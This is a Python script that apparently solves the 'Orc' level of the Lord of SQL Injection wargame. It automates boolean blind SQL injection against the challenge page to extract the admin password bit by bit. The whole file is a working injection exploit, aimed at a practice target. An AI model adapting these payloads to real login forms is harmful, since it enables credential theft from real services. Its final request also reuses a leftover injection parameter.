#!/usr/bin/python
# -*- coding: UTF-8 -*-
import requests
from sys import stdout

query = 0
print("#### Lord of SQL Injection - Orc ####\n")

url = "http://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php"


# session = "gequo9hff2f19sjmieftjnuf50"
session = raw_input("Input your LOS session : ")

headers = {
    'Cookie': 'PHPSESSID={0}'.format(session)
}

password = ""

# get the length of password
for i in range(100):
    param = "?pw=' or id='admin' and length(pw)={0}%23".format(i)

    content = requests.get(url + param, headers=headers).text
    query += 1

    if content.find("Hello admin") > -1:
        length = i
        print "[*] The length of admin password : {0}".format(i)
        break


print("\n\n#### Starting Blind SQL Injection ####\n")
#  substr(lpad(bin(ascii(substr('asdf',1,1))),7,0),1,1)

print "[*] the password : ",
stdout.flush()

for i in range(1, length+1):

    binary = ''
    for j in range(0, 8):
        param = "?pw=' or id='admin' and (select substr(lpad(bin(ascii(substr(pw,{0},1))),7,0),{1},1)=1)%23".format(i, j)
        content = requests.get(url + param, headers=headers).text
        query += 1

        if content.find("Hello admin") > 0:
            binary += '1'
        else:
            binary += '0'

    password += chr(int(binary, 2))

    print chr(int(binary, 2)),
    stdout.flush()

print "\n[*] the password : ", password


url = "http://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php?pw={0}".format(password)
content = requests.get(url + param, headers=headers).content

if content.find("<h2>ORC Clear!</h2>") > 0:
    print "ORC Clear!"

print "[+] total query : {0}".format(query)